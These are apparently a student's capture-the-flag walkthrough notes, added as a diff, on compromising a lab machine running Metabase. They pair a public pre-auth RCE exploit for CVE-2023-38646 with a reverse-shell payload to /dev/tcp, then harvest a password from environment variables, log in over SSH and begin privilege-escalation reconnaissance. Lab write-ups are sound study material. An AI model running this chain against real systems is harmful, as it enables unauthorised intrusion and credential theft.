@@ -1,0 +1,17 @@
+- nmap -sV 10.10.11.233 reveals the two open TCP ports
+- navigating to 10.10.11.233 redirects us to a "analytical.htb" site, thus we must add this domain to our /etc/hosts/ file to resolve it: echo "10.129.229.224 analytical.htb" | sudo tee -a /etc/hosts
+- we can then navigate to the page, clicking the "login" option redirects us to data.analytical.htb, so like above we must do: echo "10.129.229.224 data.analytical.htb" | sudo tee -a /etc/hosts
+- now navigating to that is login page reveals the application running the login functionality is Metabase
+- an inspection of the HTML source of the Metabase login page, with the search for the "version" keyword reveals version v0.46.6 of Metabase is runnning
+- we than browse the web for a Metabase vulnerability (CVE-2023-38646), which can be found (with its usage explained) at https://github.com/m3m0o/metabase-pre-auth-rce-poc --> python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]"
+- the python based exploit code requires that we have the "setup token" (curl data.analytical.htb/api/session/properties | grep setup-token
+) 
+- our final command, with the help of the GitHub guide: python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"
+- the exploit for the same CVE on exploit DB uses the /api/setup/validate Metabase endpoint to execute arbitrary commands using the token (not the github exploit we used) (https://www.exploit-db.com/exploits/51797)
+- once we have our shell, we can run whoami to reveal that the Metabase is running as the "metabase" user
+- next the command printenv to print the environmental variables reveals that the "metalytics" user password is stored in the "META_PASS" env variable
+- we can then use these credentials to login via ssh (ssh metalytics@analytic.htb) and snag the user flag
+- cat /proc/version or uname -a: reveals the kernel version "Linux version 6.2.0-25-generic"
+- lsb_release -a: to reveal the Ubuntu release "ubuntu 22.04.03 LTS (jammy)"
+- some googeling reveals the two 2023 CVEs affecting this Ubuintu configuration exploits a vulnerability in the OverlayFS component present on this system
+- 
